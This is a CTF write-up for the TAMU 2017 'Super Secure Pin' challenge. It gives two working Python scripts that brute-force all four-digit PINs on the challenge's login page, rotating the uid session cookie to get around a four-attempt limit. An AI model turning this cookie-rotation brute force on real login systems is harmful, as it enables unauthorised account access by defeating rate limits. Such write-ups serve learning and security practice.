# TAMU_CTF-2017-Writeups
Writeups for challenges I solved in the TAMU 2017 CTF

I am on my laptop right now, I will sperate the chalanges later

# Super Secure Pin - 100 points

## Preliminary Research
The link in question is http://pin.ctf.tamu.edu/ and there is not much too it.  After clicking a link called 'login' you get to http://pin.ctf.tamu.edu/login, this is where the fun is to be had.

I looked at the source code, but there was nothing of interest, looks like we will have to brute-force this.

I opened up [BurpSuite](https://portswigger.net/burp/) and took a look at the POST requests, there was a cookie called **uid** and then the pin, called **pin**; referer was also set as pin.ctf.tamu.edu.

I sent the POST over to the 'repeater' feature in BurpSutie.  I just wanted to try some basic combinations and save myself the time of brute-forcing.  I tried 0000, 6969, 9999, 1111, then something weird happened, I didn't get the usual error message, I got *WRONG: too many tries*.

After some testing and consulting my teammates at Umbra, we came to the conclusion that the cookie was only good for 4 tries.

So now we know what we have to do, try all 10 000 pins from 0000-9999 but get a new cookie every 4 attempts.

## The code
Normally I would use [Hydra](http://sectools.org/tool/hydra/), but Hydra wants a login and a password.  So for this I used [Python3](https://www.python.org/downloads/) with the [requests](http://docs.python-requests.org/en/master/) library.

This was the code I settled on:
```python
#!/usr/env/python3

import requests

#send a GET to refresh uid cookie
def get_cookie(url, cookie_id):
    return {cookie_id: requests.get(url).cookies[cookie_id]}

#'0000' - '9999'
pins = [str(i).zfill(4) for i in range(10000)][400:]

t_url = "http://pin.ctf.tamu.edu/login"
t_headers={'referer': 'http://pin.ctf.tamu.edu/login'}
i = 0 #lazy counter

for pin in pins:
    #every 4 attempts cookie needs to be refreshed
    if i % 3 == 0:
        t_cookies = get_cookie(t_url, 'uid')
    pin_field = {'pin': pin}
    r = requests.post(t_url, data=pin_field, cookies=t_cookies, headers=t_headers)
    if "WRONG" not in r.text:
        print(r.text)
    print(pin)
    i += 1
```

This code *will* work, but it is SLOW.  It took 20-30min to get the pin and it wasn't even half way through all possible values.  So I decided to write something faster using pythons async.  If you don't know what async is, it is like threading but neater.

I used the [grequests](https://github.com/kennethreitz/grequests) library for the following faster code:
```python
#!/usr/env/python3

#Values prefixed with 't_' are user defined
#'t_' is short for 'target_'

import grequests
import requests

def get_cookie(url, cookie_id):
    return {cookie_id: requests.get(url).cookies[cookie_id]}

def gpost_it(t_url, t_data, t_cookies, t_headers):
    return grequests.post(
        t_url, 
        data=t_data, 
        cookies=t_cookies, 
        headers=t_headers)

pins = [str(i).zfill(4) for i in range(10000)]

t_url = "http://pin.ctf.tamu.edu/login"
t_headers={'referer': 'http://pin.ctf.tamu.edu/login'}
t_cookies = get_cookie(t_url, 'uid')
to_do = []

print("Running aysnc batches of 4 requests each for cookie refreshing")
for i, pin in enumerate(pins):
    to_do.append(gpost_it(t_url, {'pin': pin}, t_cookies, t_headers))
    
    if i % 3 == 0:
        t_cookies = get_cookie(t_url, 'uid')
        to_do = set(to_do) #Done for performance
        
        for response in grequests.map(to_do):
            if "WRONG" not in response.text:
                print(response.text)
                break
            
            elif "tries" in response.text:
                print("too many tries error, adjust cookie refresh")
        
        to_do=[] #Reset list
    
    #Just me being fancy
    percent_complete = round(i/len(pins) * 100, 2)
    if percent_complete % 5 == 0:
        print(int(percent_complete), "%", end='\r')

print("C'est fini")
```
Due to the fact that in order to run async you need to assemble a 'to do' list first, and that list will be executed in pseudo-random order, we can only afford to run batches of 4 POSTs at a time, or the cookie might expire.  This requires some more code, but it **is** faster.  This wil get the flag in just under 15min.

Also because the second one was not written just as I went along, it is much neater and more 'pythonic'.
